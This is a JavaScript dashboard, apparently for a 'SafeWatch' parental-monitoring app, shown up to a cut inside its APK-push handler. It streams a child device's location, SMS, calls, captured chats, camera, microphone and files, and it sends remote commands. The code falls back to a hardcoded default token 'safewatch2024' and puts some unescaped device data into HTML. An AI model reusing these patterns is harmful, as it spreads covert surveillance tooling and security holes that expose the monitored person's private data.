/* ═══════════════════════════════════════════════════════════════════
   SafeWatch Dashboard — app.js v3
   Full handler for all 12 data types + Leaflet map + audio playback
   ═══════════════════════════════════════════════════════════════════ */

(function () {
    'use strict';

    // ─── State ────────────────────────────────────────────────────────
    let ws = null;
    let map = null;
    let mapMarker = null;
    let mapInitialised = false;
    let cameraFrameCount = 0;
    let lastFrameTime = 0;
    let audioContext = null;
    let audioQueue = [];
    let isPlayingAudio = false;
    let touchEventLog = {}; // keyed by device_id
    const MAX_TOUCH_LOG = 500;
    
    let activeDeviceId = "";
    let connectedDevices = new Set();
    let blockedApps = new Set();  // tracks currently blocked packages

    // FPS tracking
    let fpsFrames = 0;
    let fpsStart = Date.now();

    // ─── DOM refs ─────────────────────────────────────────────────────
    const statusDot    = document.getElementById('status-dot');
    const statusText   = document.getElementById('status-text');
    const childDot     = document.getElementById('child-dot');
    const childText    = document.getElementById('child-status-text');
    const activityFeed = document.getElementById('activity-feed');
    const touchFeed    = document.getElementById('touch-feed');
    const pageTitle    = document.getElementById('page-title');
    const lastUpdate   = document.getElementById('last-update');
    const deviceSelect = document.getElementById('device-select');

    // ─── Navigation ───────────────────────────────────────────────────
    const navItems = document.querySelectorAll('.nav-item');
    const views    = document.querySelectorAll('.view');

    const PAGE_TITLES = {
        overview: 'Overview', battery: 'Battery & Device', network: 'Network / IP',
        location: 'Live Location', apps: 'App Control', websites: 'Website History',
        calls: 'Call Logs', sms: 'SMS Logs', storage: 'Storage Manager',
        camera: 'Live Camera', mic: 'Live Microphone', social: 'Social Media Chats'
    };

    navItems.forEach(item => {
        item.addEventListener('click', e => {
            e.preventDefault();
            const target = item.dataset.target;
            navItems.forEach(n => n.classList.remove('active'));
            views.forEach(v => v.classList.remove('active'));
            item.classList.add('active');
            document.getElementById(`view-${target}`)?.classList.add('active');
            pageTitle.textContent = PAGE_TITLES[target] || target;

            // Init map when location tab is first opened
            if (target === 'location' && !mapInitialised) initMap();
        });
    });

    // Summary card clicks → navigate to relevant panel
    document.getElementById('sc-battery')?.addEventListener('click', () => switchTab('battery'));
    document.getElementById('sc-location')?.addEventListener('click', () => switchTab('location'));
    document.getElementById('sc-network')?.addEventListener('click', () => switchTab('network'));
    document.getElementById('sc-storage')?.addEventListener('click', () => switchTab('storage'));
    document.getElementById('sc-calls')?.addEventListener('click', () => switchTab('calls'));
    document.getElementById('sc-active-app')?.addEventListener('click', () => switchTab('apps'));

    function switchTab(target) {
        navItems.forEach(n => n.classList.remove('active'));
        views.forEach(v => v.classList.remove('active'));
        document.getElementById(`nav-${target}`)?.classList.add('active');
        document.getElementById(`view-${target}`)?.classList.add('active');
        pageTitle.textContent = PAGE_TITLES[target] || target;
        if (target === 'location' && !mapInitialised) initMap();
    }

    // ─── WebSocket ────────────────────────────────────────────────────
    /**
     * Auto-detects the relay server WebSocket URL from the page's own host.
     * When the dashboard is served from Render, window.location.host is the
     * Render URL, so wss://<host>/ws/parent is always correct — no manual input.
     *
     * Token priority: ?token= query param → hardcoded default.
     */
    function buildWsUrl() {
        const isSecure = window.location.protocol === 'https:';
        const wsProto  = isSecure ? 'wss' : 'ws';
        const host     = window.location.host; // e.g. safewatch-abc.onrender.com

        // Allow override via query string for debugging: ?token=mytoken
        const urlParams = new URLSearchParams(window.location.search);
        const token = urlParams.get('token') || 'safewatch2024';

        return `${wsProto}://${host}/ws/parent?token=${token}`;
    }


    let reconnectTimer = null;

    function connect() {
        if (ws) { try { ws.close(); } catch(e) {} ws = null; }
        if (reconnectTimer) { clearTimeout(reconnectTimer); reconnectTimer = null; }

        const url = buildWsUrl();
        const hostDisplay = document.getElementById('server-host-display');
        if (hostDisplay) hostDisplay.textContent = window.location.host || 'localhost';

        addActivity('Connecting to relay…', 'system');
        ws = new WebSocket(url);

        ws.onopen = () => {
            setServerStatus(true);
            addActivity('Connected to relay server ✓', 'system');
        };

        ws.onclose = () => {
            setServerStatus(false);
            ws = null;
            addActivity('Disconnected — retrying in 5s…', 'system');
            // Guard: only schedule one reconnect
            if (!reconnectTimer) {
                reconnectTimer = setTimeout(() => { reconnectTimer = null; connect(); }, 5000);
            }
        };

        ws.onerror = () => {
            addActivity('WebSocket error', 'system');
        };

        ws.onmessage = event => {
            if (typeof event.data === 'string') {
                try {
                    handleData(JSON.parse(event.data));
                } catch(e) {
                    addActivity(`Raw: ${event.data.substring(0,80)}`, 'data');
                }
            }
        };
    }

    document.getElementById('btnReconnect').addEventListener('click', () => {
        if (reconnectTimer) { clearTimeout(reconnectTimer); reconnectTimer = null; }
        connect();
    });

    // ─── Force Refresh ────────────────────────────────────────────────
    // Sends GET_SNAPSHOT command to child — child immediately pushes all data.
    function forceRefresh() {
        if (ws && ws.readyState === WebSocket.OPEN) {
            ws.send(JSON.stringify({ command: 'GET_SNAPSHOT' }));
            addActivity('📤 Force refresh sent to child device', 'system');
        } else {
            addActivity('⚠️ Not connected — cannot refresh', 'system');
        }
    }
    document.getElementById('btnForceRefresh')?.addEventListener('click', forceRefresh);

    // ─── Auto status poll every 10s ────────────────────────────────────
    // Polls /api/status to detect if the server sees a child connected
    // even when our WebSocket might have had an issue.
    setInterval(async () => {
        try {
            const r = await fetch('/api/status');
            if (!r.ok) return;
            const s = await r.json();
            // If server says child is online but our WS is closed, reconnect
            if (ws === null || ws.readyState === WebSocket.CLOSED) connect();
            
            // Sync device list
            if (s.connectedDevices) {
                s.connectedDevices.forEach(d => addDevice(d));
            }
        } catch(e) {}
    }, 10_000);


    // ─── Data Dispatch ────────────────────────────────────────────────
    function handleData(data) {
        const ts = new Date().toLocaleTimeString();
        lastUpdate.textContent = `Last update: ${ts}`;

        switch (data.type) {
            case 'child_status':    handleChildStatus(data); break;
            case 'file_ready':
                addActivity(`✅ File ready: ${data.filename}`, 'system');
                const a = document.createElement('a');
                a.href = data.url;
                a.target = '_blank';
                a.download = data.filename;
                document.body.appendChild(a);
                a.click();
                document.body.removeChild(a);
                break;
            case 'call_alert':
                alert(`🚨 CALL ALERT 🚨\nNumber: ${data.number}\nState: ${data.state}`);
                addActivity(`🚨 Call Alert: ${data.number} (${data.state})`, 'system');
                break;
            default:
                // Only process data for the active device
                if (data.deviceId && data.deviceId !== activeDeviceId && activeDeviceId !== "") {
                    // Just store social chat events in background
                    if (data.type === 'social_chats') {
                        if (!touchEventLog[data.deviceId]) touchEventLog[data.deviceId] = [];
                        touchEventLog[data.deviceId].unshift(data);
                        if (touchEventLog[data.deviceId].length > MAX_TOUCH_LOG) touchEventLog[data.deviceId].pop();
                    }
                    return;
                }
                
                switch(data.type) {
                    case 'battery':         handleBattery(data); break;
                    case 'network':         handleNetwork(data); break;
                    case 'location':        handleLocation(data); break;
                    case 'calls':           handleCalls(data); break;
                    case 'sms':             handleSms(data); break;
                    case 'app_usage':       handleAppUsage(data); break;
                    case 'installed_apps':  handleInstalledApps(data); break;
                    case 'storage':         handleStorage(data); break;
                    case 'camera_frame':    handleCameraFrame(data); break;
                    case 'audio_chunk':     handleAudioChunk(data); break;
                    case 'social_chats':    handleTouchEvent(data); break;
                    case 'chat_capture':    handleChatCapture(data); break;
                    case 'app_switch':      handleAppSwitch(data); break;
                    case 'screen_state':    handleScreenState(data); break;
                    case 'website_visit':   handleWebsiteVisit(data); break;
                    case 'file_list':       handleFileList(data); break;
                    case 'file_content':    handleFileContent(data); break;
                    default:
                        if (data.type) addActivity(`Unknown type: ${data.type}`, 'data');
                }
        }
    }

    function addDevice(deviceId) {
        if (!deviceId || connectedDevices.has(deviceId)) return;
        connectedDevices.add(deviceId);
        
        const option = document.createElement('option');
        option.value = deviceId;
        option.textContent = `Device: ${deviceId}`;
        
        if (deviceSelect.options[0].value === "") {
            deviceSelect.innerHTML = '';
        }
        deviceSelect.appendChild(option);
        
        if (!activeDeviceId) {
            activeDeviceId = deviceId;
            deviceSelect.value = deviceId;
            // Fetch snapshot for this device
            forceRefresh();
        }
    }

    deviceSelect?.addEventListener('change', (e) => {
        activeDeviceId = e.target.value;
        addActivity(`Switched to device: ${activeDeviceId}`, 'system');
        clearDashboard();
        forceRefresh();
    });
    
    function clearDashboard() {
        ['bat-percent', 'bat-status', 'bat-source', 'bat-health', 'bat-temp', 'bat-voltage', 'ov-battery',
         'net-type', 'net-ssid', 'net-wifi-ip', 'net-carrier', 'net-all-ips', 'ov-network',
         'loc-lat', 'loc-lng', 'loc-accuracy', 'loc-altitude', 'loc-speed', 'loc-provider', 'loc-updated', 'ov-location'
        ].forEach(id => setText(id, '—'));
        
        const fills = document.querySelectorAll('.ring-fill, .storage-bar-fill');
        fills.forEach(f => f.style.width = '0%');
        
        ['calls-tbody', 'sms-tbody', 'websites-tbody'].forEach(id => {
            const el = document.getElementById(id);
            if (el) el.innerHTML = '<tr><td colspan="4" class="empty">Waiting for data...</td></tr>';
        });
        
        renderTouchFeed();
    }

    // ─── Child Status ─────────────────────────────────────────────────
    function handleChildStatus(data) {
        if (data.deviceId) addDevice(data.deviceId);
        
        if (data.deviceId === activeDeviceId || !activeDeviceId) {
            const online = data.online;
            childDot.className = `child-dot ${online ? 'online' : 'offline'}`;
            childText.textContent = online ? 'Child Online' : 'Child Offline';
            addActivity(online ? `📱 Child device connected! (${data.deviceId})` : `📴 Child device disconnected (${data.deviceId})`, 'system');
        }
    }

    // ─── Battery ──────────────────────────────────────────────────────
    function handleBattery(data) {
        const pct = data.percentage;
        setText('bat-percent', pct);
        setText('bat-status', data.status);
        setText('bat-source', data.chargeSource);
        setText('bat-health', data.health);
        setText('bat-temp', `${data.temperatureC}°C`);
        setText('bat-voltage', `${data.voltageV}V`);
        setText('ov-battery', `${pct}% — ${data.status}`);

        // Animate battery ring
        const circumference = 314; // 2π × 50
        const offset = circumference - (pct / 100) * circumference;
        const fill = document.getElementById('battery-ring-fill');
        if (fill) {
            fill.style.strokeDashoffset = offset;
            fill.style.stroke = pct > 50 ? '#10b981' : pct > 20 ? '#f59e0b' : '#ef4444';
        }

        addActivity(`🔋 Battery: ${pct}% (${data.status})`, 'data');
    }

    // ─── Network ──────────────────────────────────────────────────────
    function handleNetwork(data) {
        setText('net-type',    data.networkType);
        setText('net-ssid',    data.ssid);
        setText('net-wifi-ip', data.wifiIp);
        setText('net-carrier', data.carrierName || 'N/A');
        setText('net-all-ips', data.allIps || '—');
        setText('ov-network',  `${data.networkType} — ${data.wifiIp}`);
        addActivity(`📡 Network: ${data.networkType} (${data.wifiIp})`, 'data');
    }

    // ─── Location ─────────────────────────────────────────────────────
    function handleLocation(data) {
        const lat = data.lat.toFixed(6);
        const lng = data.lng.toFixed(6);
        setText('loc-lat',      lat);
        setText('loc-lng',      lng);
        setText('loc-accuracy', `${data.accuracy?.toFixed(1)} m`);
        setText('loc-altitude', `${data.altitude?.toFixed(1)} m`);
        setText('loc-speed',    `${(data.speed * 3.6)?.toFixed(1)} km/h`);
        setText('loc-provider', data.provider);
        setText('loc-updated',  new Date(data.ts).toLocaleTimeString());
        setText('ov-location',  `${lat}, ${lng}`);

        const mapsLink = document.getElementById('loc-maps-link');
        if (mapsLink) mapsLink.href = `https://www.google.com/maps?q=${data.lat},${data.lng}`;

        // Update Leaflet map
        if (mapInitialised && map) {
            if (mapMarker) {
                mapMarker.setLatLng([data.lat, data.lng]);
            } else {
                mapMarker = L.marker([data.lat, data.lng], {
                    icon: L.divIcon({
                        className: '',
                        html: '<div style="width:16px;height:16px;background:#6366f1;border:3px solid white;border-radius:50%;box-shadow:0 0 12px rgba(99,102,241,0.8)"></div>',
                        iconSize: [16, 16],
                        iconAnchor: [8, 8]
                    })
                }).addTo(map)
                  .bindPopup(`<b>Child Location</b><br>Accuracy: ${data.accuracy?.toFixed(0)}m<br>${new Date(data.ts).toLocaleTimeString()}`);
            }
            map.setView([data.lat, data.lng], map.getZoom() < 12 ? 15 : map.getZoom());
        }

        addActivity(`📍 Location updated: ${lat}, ${lng}`, 'data');
    }

    function initMap() {
        if (mapInitialised) return;
        map = L.map('leaflet-map', {
            center: [0, 0],
            zoom: 2,
            zoomControl: true
        });
        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
            attribution: '© OpenStreetMap',
            maxZoom: 19
        }).addTo(map);
        mapInitialised = true;
    }

    // ─── Calls ────────────────────────────────────────────────────────
    function handleCalls(data) {
        const tbody = document.getElementById('calls-tbody');
        if (!tbody) return;
        tbody.innerHTML = '';

        if (!data.logs || data.logs.length === 0) {
            tbody.innerHTML = '<tr><td colspan="4" class="empty">No call logs received</td></tr>';
            return;
        }

        setText('ov-calls', `${data.logs[0]?.name || data.logs[0]?.number || '—'}`);
        const badgeMap = { Incoming: 'badge-green', Outgoing: 'badge-blue', Missed: 'badge-red', Rejected: 'badge-red', Blocked: 'badge-orange' };

        data.logs.forEach(log => {
            const tr = document.createElement('tr');
            const badge = badgeMap[log.callType] || 'badge-blue';
            tr.innerHTML = `
                <td>${log.name ? log.name + ' (' + log.number + ')' : (log.number || '—')}</td>
                <td><span class="badge ${badge}">${log.callType}</span></td>
                <td>${formatDuration(log.duration)}</td>
                <td>${new Date(log.date).toLocaleString()}</td>
            `;
            tbody.appendChild(tr);
        });
        addActivity(`📞 ${data.count} call logs received`, 'data');
    }

    // ─── SMS ──────────────────────────────────────────────────────────
    function handleSms(data) {
        const tbody = document.getElementById('sms-tbody');
        if (!tbody) return;
        tbody.innerHTML = '';

        if (!data.messages || data.messages.length === 0) {
            tbody.innerHTML = '<tr><td colspan="4" class="empty">No SMS messages received</td></tr>';
            return;
        }

        data.messages.forEach(msg => {
            const tr = document.createElement('tr');
            const badge = msg.type === 'Sent' ? 'badge-blue' : 'badge-green';
            tr.innerHTML = `
                <td>${msg.address || '—'}</td>
                <td><span class="badge ${badge}">${msg.type}</span></td>
                <td style="max-width:300px;overflow:hidden;text-overflow:ellipsis">${escapeHtml(msg.body)}</td>
                <td>${new Date(msg.date).toLocaleString()}</td>
            `;
            tbody.appendChild(tr);
        });
        addActivity(`💬 ${data.count} SMS messages received`, 'data');
    }

    // ─── App Usage ────────────────────────────────────────────────────
    function handleAppUsage(data) {
        const appList = document.getElementById('app-list');
        if (!appList) return;
        appList.innerHTML = '';

        if (!data.apps || data.apps.length === 0) {
            appList.innerHTML = '<div class="empty-state">No app usage data</div>';
            return;
        }

        const maxMinutes = data.apps[0]?.totalMinutes || 1;
        setText('ov-active-app', data.apps[0]?.appName || '—');

        data.apps.forEach(app => {
            const isBlocked = blockedApps.has(app.packageName);
            const div = document.createElement('div');
            div.className = 'app-item';
            div.dataset.pkg = app.packageName;
            div.innerHTML = `
                <div class="app-icon-placeholder">📱</div>
                <div class="app-details">
                    <div class="app-name">${escapeHtml(app.appName)}</div>
                    <div class="app-pkg">${app.packageName}</div>
                </div>
                <div class="app-time">${app.totalMinutes}m</div>
                <label class="toggle-switch" title="${isBlocked ? 'Blocked' : 'Allowed'} — toggle to ${isBlocked ? 'unblock' : 'block'}">
                    <input type="checkbox" class="app-block-toggle" data-pkg="${app.packageName}" ${isBlocked ? '' : 'checked'}>
                    <span class="slider"></span>
                </label>
            `;
            appList.appendChild(div);
        });

        // Attach toggle listeners
        document.querySelectorAll('.app-block-toggle').forEach(toggle => {
            toggle.addEventListener('change', e => {
                const pkg = e.target.dataset.pkg;
                const allowed = e.target.checked;
                if (allowed) {
                    blockedApps.delete(pkg);
                    sendCommand({ command: 'UNBLOCK_APP', package: pkg });
                    addActivity(`✅ Unblocked: ${pkg}`, 'command');
                } else {
                    blockedApps.add(pkg);
                    sendCommand({ command: 'BLOCK_APP', package: pkg });
                    addActivity(`🚫 Blocked: ${pkg}`, 'command');
                }
            });
        });

        addActivity(`📱 ${data.count} apps usage data received`, 'data');
    }

    function handleInstalledApps(data) {
        // Could supplement app list — just log for now
        addActivity(`📋 ${data.count} installed apps reported`, 'data');
    }

    // ─── Storage ──────────────────────────────────────────────────────
    function handleStorage(data) {
        if (data.internal) {
            const int = data.internal;
            const pct = int.usedPercent || 0;
            const fillEl = document.getElementById('storage-bar-int');
            if (fillEl) fillEl.style.width = `${pct}%`;
            setText('storage-int-text', `${int.usedGB} GB used of ${int.totalGB} GB`);
            setText('stor-int-total', `${int.totalGB} GB`);
            setText('stor-int-used',  `${int.usedGB} GB`);
            setText('stor-int-free',  `${int.freeGB} GB`);
            setText('ov-storage', `${int.usedGB} / ${int.totalGB} GB`);
        }

        if (data.breakdown && data.breakdown.length > 0) {
            const bd = document.getElementById('storage-breakdown');
            if (bd) {
                const maxMB = Math.max(...data.breakdown.map(c => c.sizeMB), 1);
                bd.innerHTML = data.breakdown.map(cat => `
                    <div class="category-bar">
                        <span class="category-bar-label">${cat.category}</span>
                        <div class="category-bar-track">
                            <div class="category-bar-fill" style="width:${(cat.sizeMB/maxMB*100).toFixed(0)}%"></div>
                        </div>
                        <span class="category-bar-value">${cat.sizeMB} MB</span>
                    </div>
                `).join('');
            }
        }
        addActivity(`💾 Storage data updated`, 'data');
    }

    // ─── Camera ───────────────────────────────────────────────────────
    function handleCameraFrame(data) {
        const feed = document.getElementById('camera-feed');
        const placeholder = document.getElementById('camera-placeholder');
        if (!feed) return;

        feed.src = `data:image/jpeg;base64,${data.data}`;
        feed.style.display = 'block';
        if (placeholder) placeholder.style.display = 'none';

        cameraFrameCount++;
        document.getElementById('cam-frame-count').textContent = `${cameraFrameCount} frames received`;
        document.getElementById('cam-last-update').textContent = `Last: ${new Date().toLocaleTimeString()}`;

        // FPS calc
        fpsFrames++;
        const now = Date.now();
        if (now - fpsStart >= 2000) {
            const fps = (fpsFrames / ((now - fpsStart) / 1000)).toFixed(1);
            document.getElementById('camera-fps').textContent = `${fps} fps`;
            fpsFrames = 0;
            fpsStart = now;
        }
    }

    // ─── Audio ────────────────────────────────────────────────────────
    function handleAudioChunk(data) {
        const canvas = document.getElementById('audio-canvas');
        const placeholder = document.getElementById('mic-placeholder');
        if (canvas) canvas.style.display = 'block';
        if (placeholder) placeholder.style.display = 'none';

        // Decode base64 → PCM → visualize
        try {
            const raw = atob(data.data);
            const bytes = new Uint8Array(raw.length);
            for (let i = 0; i < raw.length; i++) bytes[i] = raw.charCodeAt(i);

            // Interpret as 16-bit PCM
            const pcm = new Int16Array(bytes.buffer);
            drawAudioWave(canvas, pcm);

            // Web Audio playback
            playPcmChunk(pcm, data.sampleRate || 16000);
        } catch(e) {
            console.warn('Audio decode error:', e);
        }
    }

    function drawAudioWave(canvas, pcm) {
        const ctx = canvas.getContext('2d');
        const W = canvas.width;
        const H = canvas.height;

        ctx.fillStyle = 'rgba(0,0,0,0.5)';
        ctx.fillRect(0, 0, W, H);

        ctx.strokeStyle = '#6366f1';
        ctx.lineWidth = 2;
        ctx.shadowBlur = 8;
        ctx.shadowColor = '#6366f1';
        ctx.beginPath();

        const step = Math.max(1, Math.floor(pcm.length / W));
        for (let x = 0; x < W; x++) {
            const idx = x * step;
            const v = pcm[idx] / 32768;
            const y = (v + 1) / 2 * H;
            x === 0 ? ctx.moveTo(x, y) : ctx.lineTo(x, y);
        }
        ctx.stroke();
        ctx.shadowBlur = 0;
    }

    function playPcmChunk(pcm, sampleRate) {
        if (!audioContext) {
            audioContext = new (window.AudioContext || window.webkitAudioContext)({ sampleRate });
        }
        const buffer = audioContext.createBuffer(1, pcm.length, sampleRate);
        const channelData = buffer.getChannelData(0);
        for (let i = 0; i < pcm.length; i++) {
            channelData[i] = pcm[i] / 32768;
        }
        const source = audioContext.createBufferSource();
        source.buffer = buffer;
        source.connect(audioContext.destination);
        source.start();
    }

    // ─── Touch Activity ───────────────────────────────────────────────
    function handleTouchEvent(data) {
        const devId = data.deviceId || activeDeviceId;
        if (!touchEventLog[devId]) touchEventLog[devId] = [];
        
        touchEventLog[devId].unshift(data);
        if (touchEventLog[devId].length > MAX_TOUCH_LOG) touchEventLog[devId].pop();
        
        if (devId === activeDeviceId) {
            renderTouchFeed();
            // Also add to overview feed for important events
            if (['APP_BLOCKED', 'TEXT_INPUT'].includes(data.eventType)) {
                addActivity(`${data.eventType}: ${data.description?.substring(0,60)}`, 'data');
            }
        }
    }

    function renderTouchFeed() {
        const log = touchEventLog[activeDeviceId] || [];
        const filterApp = document.getElementById('social-filter')?.value || '';

        const filtered = filterApp
            ? log.filter(e => (e.appName || '').includes(filterApp) ||
                              (e.package || '').includes(filterApp.toLowerCase()) ||
                              (e.description || '').includes(filterApp))
            : log;

        const touchFeed = document.getElementById('social-feed');
        if (!touchFeed) return;

        touchFeed.innerHTML = '';

        if (filtered.length === 0) {
            touchFeed.innerHTML = '<li class="feed-item system">No events yet.</li>';
            return;
        }

        filtered.slice(0, 300).forEach(event => {
            const li = document.createElement('li');
            li.className = 'feed-item system';

            const appLabel = event.appName || (event.package?.split('.').pop() ?? 'Unknown');
            const time = new Date(event.ts).toLocaleTimeString();

            // Badge color by event type
            const badgeColors = {
                'chat_capture': '#6366f1',
                'social_chats': '#3b82f6',
                'app_switch':   '#10b981',
                'website_visit':'#f59e0b',
            };
            const color = badgeColors[event.type] || '#64748b';

            if (event.type === 'chat_capture' && event.messages?.length) {
                // Rich display: show each captured message as a bubble
                const msgs = event.messages.map(m =>
                    `<div style="background:#1e293b;padding:4px 8px;border-radius:6px;margin:2px 0;font-size:12px;max-width:500px;word-break:break-word">${escapeHtml(m)}</div>`
                ).join('');
                li.innerHTML = `
                    <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:4px">
                        <span style="background:${color};color:white;padding:2px 8px;border-radius:4px;font-size:10px;font-weight:600">📸 ${escapeHtml(appLabel)} — Screen Capture</span>
                        <span class="event-time">${time}</span>
                    </div>
                    ${msgs}
                `;
            } else {
                // Simple one-line event
                li.innerHTML = `
                    <span style="background:${color};color:white;padding:2px 6px;border-radius:4px;font-size:10px">${escapeHtml(appLabel)}</span>
                    <span>${escapeHtml(event.description?.substring(0, 250) || event.type)}</span>
                    <span class="event-time">${time}</span>
                `;
            }
            touchFeed.appendChild(li);
        });
    }

    document.getElementById('btn-clear-social')?.addEventListener('click', () => {
        if (activeDeviceId) {
            touchEventLog[activeDeviceId] = [];
            document.getElementById('social-feed').innerHTML = '<li class="feed-item system">Log cleared.</li>';
        }
    });

    // Re-render feed when filter changes
    document.getElementById('social-filter')?.addEventListener('change', () => renderTouchFeed());

    // ─── Chat capture (accessibility tree snapshot) ───────────────────
    function handleChatCapture(data) {
        const devId = data.deviceId || activeDeviceId;
        if (!touchEventLog[devId]) touchEventLog[devId] = [];
        touchEventLog[devId].unshift(data);
        if (touchEventLog[devId].length > MAX_TOUCH_LOG) touchEventLog[devId].pop();
        if (devId === activeDeviceId) {
            renderTouchFeed();
            addActivity(`💬 ${data.appName}: ${data.messages?.length || 0} text(s) captured`, 'data');
        }
    }

    // ─── App switch (real-time foreground app) ────────────────────────
    function handleAppSwitch(data) {
        setText('ov-curr-app', data.appName || data.package?.split('.').pop() || '—');
        addActivity(`📱 App opened: ${data.appName || data.package}`, 'data');
    }

    // ─── Screen state ─────────────────────────────────────────────────
    function handleScreenState(data) {
        const isOn = data.isOn;
        const el = document.getElementById('ov-screen');
        if (el) {
            el.textContent = isOn ? '🟢 ON' : '🔴 OFF';
            el.style.color = isOn ? '#10b981' : '#ef4444';
        }
        addActivity(`${isOn ? '🔆' : '⚫'} Screen ${isOn ? 'ON' : 'OFF'}`, 'data');
    }


    function handleWebsiteVisit(data) {
        const tbody = document.getElementById('websites-tbody');
        if (!tbody) return;

        if (tbody.children[0]?.classList.contains('empty')) tbody.innerHTML = '';

        const tr = document.createElement('tr');
        tr.innerHTML = `
            <td style="max-width:280px;overflow:hidden;text-overflow:ellipsis">
                <a href="${escapeHtml(data.url)}" target="_blank" style="color:#818cf8">${escapeHtml(data.url)}</a>
            </td>
            <td>${data.browser?.split('.').pop() || '—'}</td>
            <td>${new Date(data.ts).toLocaleTimeString()}</td>
        `;
        tbody.insertBefore(tr, tbody.firstChild);

        // Keep last 200
        while (tbody.children.length > 200) tbody.removeChild(tbody.lastChild);

        addActivity(`🌐 Visited: ${data.url?.substring(0, 60)}`, 'data');
    }

    // ─── File Browser ───────────────────────────────────────────────
    let currentFilePath = '/sdcard';

    function browseDirectory(path) {
        currentFilePath = path;
        sendCommand({ command: 'LIST_FILES', path: path });
        addActivity(`📁 Browsing: ${path}`, 'command');
    }

    function handleFileList(data) {
        const container = document.getElementById('file-browser-content');
        if (!container) return;

        // Update breadcrumb
        const breadcrumb = document.getElementById('file-breadcrumb');
        if (breadcrumb) {
            const parts = data.path.split('/').filter(Boolean);
            let html = '<span class="bc-part" data-path="/sdcard" style="cursor:pointer;color:#818cf8">/sdcard</span>';
            let built = '';
            parts.forEach((p, i) => {
                built += '/' + p;
                const snap = built;
                html += ` / <span class="bc-part" data-path="${escapeHtml(snap)}" style="cursor:pointer;color:#818cf8">${escapeHtml(p)}</span>`;
            });
            breadcrumb.innerHTML = html;
            breadcrumb.querySelectorAll('.bc-part').forEach(el => {
                el.addEventListener('click', () => browseDirectory(el.dataset.path));
            });
        }

        if (data.error) {
            container.innerHTML = `<div class="file-error">⚠️ ${escapeHtml(data.error)}</div>`;
            return;
        }

        let html = '';

        // Back button
        if (data.parent) {
            html += `<div class="file-entry" data-path="${escapeHtml(data.parent)}" data-isdir="true">
                <span class="file-icon">📁</span>
                <span class="file-name">.. (go up)</span>
            </div>`;
        }

        if (!data.files || data.files.length === 0) {
            html += '<div class="file-empty">Empty folder</div>';
        } else {
            data.files.forEach(f => {
                if (f.isDir) {
                    html += `<div class="file-entry dir" data-path="${escapeHtml(f.path)}" data-isdir="true">
                        <span class="file-icon">📂</span>
                        <span class="file-name">${escapeHtml(f.name)}</span>
                        <span class="file-meta">&nbsp;</span>
                    </div>`;
                } else {
                    const readable = f.readable;
                    html += `<div class="file-entry" data-path="${escapeHtml(f.path)}" data-isdir="false">
                        <span class="file-icon">${getFileIcon(f.name)}</span>
                        <span class="file-name">${escapeHtml(f.name)}</span>
                        <span class="file-meta">${formatBytes(f.size)} &bull; ${new Date(f.modified).toLocaleDateString()}</span>
                        ${readable ? `<button class="btn-download" data-path="${escapeHtml(f.path)}">⬇️ Download</button>` : '<span style="color:#f87171">No access</span>'}
                    </div>`;
                }
            });
        }
        container.innerHTML = html;

        // Attach click handlers
        container.querySelectorAll('.file-entry').forEach(el => {
            el.addEventListener('click', (e) => {
                if (e.target.classList.contains('btn-download')) return;  // handled below
                if (el.dataset.isdir === 'true') browseDirectory(el.dataset.path);
            });
        });
        container.querySelectorAll('.btn-download').forEach(btn => {
            btn.addEventListener('click', (e) => {
                e.stopPropagation();
                sendCommand({ command: 'DOWNLOAD_FILE', path: btn.dataset.path });
                addActivity(`⬇️ Downloading: ${btn.dataset.path.split('/').pop()}`, 'command');
                btn.textContent = '⏳ Waiting...';
                btn.disabled = true;
            });
        });
    }

    function handleFileContent(data) {
        if (data.error) {
            addActivity(`❌ Download failed: ${data.error}`, 'system');
            // Re-enable download button
            document.querySelectorAll('.btn-download[disabled]').forEach(b => {
                b.textContent = '⬇️ Download'; b.disabled = false;
            });
            return;
        }

        // Decode base64 and trigger browser download
        try {
            const binary = atob(data.data);
            const bytes  = new Uint8Array(binary.length);
            for (let i = 0; i < binary.length; i++) bytes[i] = binary.charCodeAt(i);
            const blob = new Blob([bytes]);
            const url  = URL.createObjectURL(blob);
            const a    = document.createElement('a');
            a.href     = url;
            a.download = data.name || 'download';
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);
            URL.revokeObjectURL(url);
            addActivity(`✅ Downloaded: ${data.name} (${data.size} bytes)`, 'system');
        } catch(e) {
            addActivity(`❌ Decode error: ${e.message}`, 'system');
        }
    }

    function getFileIcon(name) {
        const ext = name.split('.').pop().toLowerCase();
        const icons = {
            jpg: '🖼️', jpeg: '🖼️', png: '🖼️', gif: '🖼️', webp: '🖼️',
            mp4: '🎥', avi: '🎥', mkv: '🎥', mov: '🎥',
            mp3: '🎵', wav: '🎵', aac: '🎵',
            pdf: '📝', doc: '📝', docx: '📝', txt: '📝',
            apk: '🧰', zip: '🗃️', rar: '🗃️',
        };
        return icons[ext] || '📄';
    }

    // Initial load of file browser when tab is opened
    document.querySelector('[data-target="storage"]')?.addEventListener('click', () => {
        setTimeout(() => {
            const container = document.getElementById('file-browser-content');
            if (container && container.querySelector('.empty-state')) {
                browseDirectory('/sdcard');
            }
        }, 300);
    });
    document.getElementById('btn-browse-root')?.addEventListener('click', () => browseDirectory('/sdcard'));
    document.getElementById('btn-browse-refresh')?.addEventListener('click', () => browseDirectory(currentFilePath));

    // ─── Commands ─────────────────────────────────────────────────────
    function sendCommand(obj) {
        if (ws && ws.readyState === WebSocket.OPEN) {
            if (activeDeviceId) {
                obj.target_device = activeDeviceId;
            }
            ws.send(JSON.stringify(obj));
        } else {
            addActivity('❌ Cannot send command — not connected', 'command');
        }
    }

    document.getElementById('btn-lock')?.addEventListener('click', () => {
        if (!confirm('Lock the child\'s device now?')) return;
        sendCommand({ command: 'LOCK_DEVICE' });
        addActivity('🔒 LOCK_DEVICE command sent', 'command');
    });

    document.getElementById('btn-snapshot')?.addEventListener('click', () => {
        sendCommand({ command: 'GET_SNAPSHOT' });
        addActivity('🔄 Snapshot requested', 'system');
    });

    document.getElementById('btn-uninstall')?.addEventListener('click', () => {
        if (!confirm('WARNING: This will attempt to completely remove the SafeWatch app from the child device. Continue?')) return;
        sendCommand({ command: 'UNINSTALL_APP' });
        addActivity('🗑️ UNINSTALL_APP command sent', 'command');
    });

    // ─── Push APK Update ─────────────────────────────────────────────────
    document.getElementById('btn-push-update')?.addEventListener('click', () => {
        const input = document.createElement('input');
        input.type = 'file';
        input.accept = '.apk';
        input.onchange = async (e) => {
            const file = e.target.files[0];
            if (!file) return;

            const token = new URLSearchParams(window.location.search).get('token') || 'safewatch2024';

